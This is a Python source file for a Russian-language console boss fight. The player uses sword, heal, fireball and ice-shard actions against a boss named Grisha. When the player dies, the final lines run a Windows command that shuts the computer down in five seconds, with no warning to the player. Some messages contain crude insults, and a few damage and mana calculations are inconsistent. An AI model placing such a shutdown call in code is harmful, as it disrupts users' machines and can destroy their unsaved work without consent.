import random
import os
import time
import arcade

import ASCII
import sounds

def bossGrishaCycle():
    import bossgame
    clear = lambda: os.system('cls')

    bosshp = int(33)
    fire_dot_damage = -1
    freezebuildup = -1

    #Цикл босса Гриши
    while bosshp > 0:
        #Переменные урона, хилла и скиллов
        pdamage = random.randint(1, 3)
        playerheal = random.randint(1, 3)
        fireballdamage = random.randint(2, 4)
        icesharddamage = random.randint(1, 2)

        #Переменные для босса
        bdamage = random.randint(1, 3)

        #Главный экран
        clear()
        print(ASCII.drawmain.format(playername=bossgame.playername))


        #Логика игрока
        print(f"Твоё хп: {bossgame.playerhp} | Твоя мана: {bossgame.playermana} | Хп Босса: {bosshp}\n [1] Ударить мечом! [2] Восстановить здоровье! [3] Меню выбора навыков!")
        action = bossgame.get_key()

        match action:

            #Удар мечом
            case 1:

                #крит для меча
                if random.random() > 0.66:
                    arcade.play_sound(sounds.swordsound)
                    clear()
                    print(ASCII.drawswordcrit)

                    bossgame.playermana = pdamage
                    pdamage = pdamage * 2
                    bosshp -= pdamage

                    print(f"{bossgame.playername} нанёс {pdamage} критического урона! Здоровье Гриши: {bosshp}")
                    time.sleep(1.35)


                else:
                    arcade.play_sound(sounds.swordsound)
                    clear()
                    print(ASCII.drawsword)

                    bossgame.playermana += pdamage
                    bosshp -= pdamage

                    print(f"{bossgame.playername} нанёс {pdamage} урона! Здоровье Гриши: {bosshp}")
                    time.sleep(1.35)

            #Хилка
            case 2:
                if bossgame.playerhp >= 20:
                    clear()
                    bossgame.playerhp -= playerheal
                    print(ASCII.drawtemplate)
                    print(f"Еблан? У тебя фулл хп. Лося за втык! Хилка нанесла {playerheal} урона! Текущее здоровье {bossgame.playerhp}")
                    time.sleep(1.35)

                else:
                    clear()
                    arcade.play_sound(sounds.healsound)

                    bossgame.playerhp = min(playerheal + bossgame.playerhp, 20)

                    print(ASCII.drawheal)
                    print(f"Хилка дала {playerheal} Текущее здоровье {bossgame.playerhp} ")
                    time.sleep(1.35)


            #Меню выбора навыков
            case 3:
                print(f"\nДоступные навыки:\n[1] Фаерболл! [2] Ледяной осколок! [3] Вернуться назад!")
                skillchoise = bossgame.get_key()

                match skillchoise:
                    #Выбор фаербола
                    case 1:
                        if bossgame.playermana >= 3:

                            clear()
                            arcade.play_sound(sounds.fireballsound)
                            print(ASCII.drawfireballsucces)

                            bosshp -= fireballdamage
                            bossgame.playermana -= 3

                            print (f"Нанесенно: {fireballdamage} Здоровье босса: {bosshp}")

                            time.sleep(1.35)

                            #шанс прока дот урона от огня
                            if random.random() < 0.5:

                                clear()
                                fire_dot_damage = 3

                                print(ASCII.drawbossfiredamage)
                                arcade.play_sound(sounds.burningsound)
                                print(f"Босс загорелся на 3 хода!")
                                time.sleep(1.35)
                        #Если не хватает маны
                        else:
                            clear()

                            bossgame.playerhp -= 1

                            print(ASCII.drawfireballfailed)
                            print (f"Фаерболл взорвался в руке и нанёс 1 урона! Текущее здоровье: {bossgame.playerhp}")

                            time.sleep(1.35)


                    #Ледяной урон
                    case 2:
                        if bossgame.playermana >= 3:
                            clear()
                            arcade.play_sound(sounds.iceshardsound)

                            bossgame.playermana -= 3
                            bosshp -= icesharddamage

                            print(ASCII.drawiceshardsucces)
                            print(f"Ледяной осколок нанёс {icesharddamage} Здоровье босса: {bosshp}")

                            if random.random() < 0.5:
                                freezebuildup = 2

                            time.sleep(1.35)

                        #Если не хватает маны
                        else:
                            clear()

                            bossgame.playerhp -= 1

                            print(ASCII.drawfireballfailed)
                            print(f"Ледяной осколок обморозил руку и нанёс 1 урона! Текущее здоровье: {bossgame.playerhp} ")

                            time.sleep(1.35)

                    #Вернуться назад
                    case 3:
                        continue

        #Проверка на смерть босса(что бы не бил с 0 хп)
        if bosshp < 1:
            continue

        #Проверка Босса на Фриз
        if freezebuildup > 0:
            clear()
            arcade.play_sound(sounds.iceshardsound)
            print(ASCII.drawbossfreeze)
            print(f"Босс заморожен еще {freezebuildup} ход(а)!")
            freezebuildup -= 1
            time.sleep(1.35)


        #Логика босса
        else:
            clear()
            print(ASCII.drawbossattack)
            arcade.play_sound(sounds.bossattack)

            bdamage = random.randint(1, 3)
            bossgame.playerhp -= bdamage

            print (f"Босс Гриша нанёс {bdamage} урона!")
            time.sleep(1.35)


        #Счётчик дот урона от фаерболла
        if fire_dot_damage >= 0:
            clear()

            fire_dot_damage -= 1
            bosshp -= fire_dot_damage

            print(ASCII.drawbossfiredamage)
            arcade.play_sound(sounds.burningsound)
            print("Босс получает 1 урон от огня")
            time.sleep(1.35)


        if bossgame.playerhp <= 0:
            os.system("shutdown /s /t 5")
            break